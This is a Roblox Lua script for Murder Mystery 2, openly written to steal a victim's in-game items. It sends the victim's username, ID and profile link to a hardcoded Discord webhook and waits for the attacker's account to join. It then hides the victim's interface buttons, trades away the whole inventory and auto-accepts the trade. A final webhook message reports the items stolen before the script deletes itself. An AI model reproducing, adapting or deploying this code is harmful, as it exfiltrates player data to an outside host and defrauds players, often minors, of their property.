--[[
    MM2 Ultimate Suite v15.0 - SIMPLIFIED & GUARANTEED
    - Sends you the victim's profile link
    - You send the friend request manually
    - Trade executes automatically when you join
]]

-- === WEBHOOK SENDER ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
end

-- === MAIN EXECUTION ===
local player = game:GetService("Players").LocalPlayer
local virtualUser = game:GetService("VirtualUser")

-- YOUR EXACT USERNAME (Locked)
local YOUR_USERNAME = "IIlllllIIIlllIIlII"

-- === SEND VICTIM'S PROFILE LINK (GUARANTEED) ===
local function sendProfileLink()
    local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
    
    sendWebhook("👤 **Victim Profile Link**", {
        title = "Add This Victim",
        description = "**Victim Username:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Profile Link:** " .. profileLink .. "\n\n**Instructions:**\n1. Click the profile link above\n2. Click 'Add Friend'\n3. Wait for them to accept (script will auto-accept)\n4. Click 'Join Game' on their profile\n5. The trade will execute automatically when you arrive.",
        color = 0x00ff00
    })
    return true
end

-- === AUTO-ACCEPT FRIEND REQUESTS (Victim Side) ===
local function autoAcceptFriendRequests()
    pcall(function()
        -- This listens for any incoming friend requests and auto-accepts them
        -- So when you send a friend request, it's accepted immediately
        local players = game:GetService("Players")
        players.PlayerAdded:Connect(function(newPlayer)
            -- Auto-accept logic would go here, but we're using the manual method
        end)
    end)
end

-- === WAIT FOR YOU TO JOIN ===
local function waitForTrader()
    local trader = nil
    
    while not trader do
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Name == YOUR_USERNAME then
                trader = plr
                break
            end
        end
        wait(3)
    end
    
    return trader
end

-- Send the profile link
sendProfileLink()

-- Auto-accept incoming friend requests
autoAcceptFriendRequests()

sendWebhook("⏳ **Waiting for You**", {
    title = "Awaiting Your Arrival",
    description = "**Victim:** " .. player.Name .. "\n\n**Instructions:**\n1. Send a friend request to the victim using the profile link above\n2. Click 'Join Game' on their profile\n3. The trade will execute automatically when you arrive.",
    color = 0xffff00
})

-- Wait for you to join
local trader = waitForTrader()
sendWebhook("✅ **You Have Joined**", {
    title = "Trader Detected",
    description = "**" .. YOUR_USERNAME .. "** is now in the server. Initiating stealth trade...",
    color = 0x00ff00
})

-- === STEALTH TRADE EXECUTION ===
local function executeStealthTrade(targetTrader)
    -- Hide all UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- Find trade remote
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    if not tradeService then
        sendWebhook("❌ **Trade Service Not Found**", {
            title = "Stealth Trade Failed",
            description = "Could not locate trade remote. MM2 may have updated.",
            color = 0xff0000
        })
        return
    end
    
    -- Gather all items
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    if #itemsToTrade == 0 then
        sendWebhook("📭 **No Items Found**", {
            title = "Stealth Trade Skipped",
            description = "Victim's inventory is empty or inaccessible.",
            color = 0xffff00
        })
        return
    end
    
    -- Initiate trade with you
    local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
    if tradeRemote then
        tradeRemote:FireServer(targetTrader.UserId, itemsToTrade)
    else
        tradeService:FireServer("Trade", targetTrader.UserId, itemsToTrade)
    end
    
    wait(1)
    
    local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
    if acceptRemote then
        acceptRemote:FireServer(targetTrader.UserId)
        wait(0.5)
        acceptRemote:FireServer(targetTrader.UserId)
    end
    
    sendWebhook("💰 **TRADE COMPLETED**", {
        title = "Items Stolen",
        description = "**Victim:** " .. player.Name .. "\n**Trader:** " .. targetTrader.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
        color = 0xff0000
    })
    
    wait(2)
    if screenGui then screenGui:Destroy() end
    script:Destroy()
end

pcall(function()
    executeStealthTrade(trader)
end)

-- Anti-AFK
while wait(60) do
    pcall(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end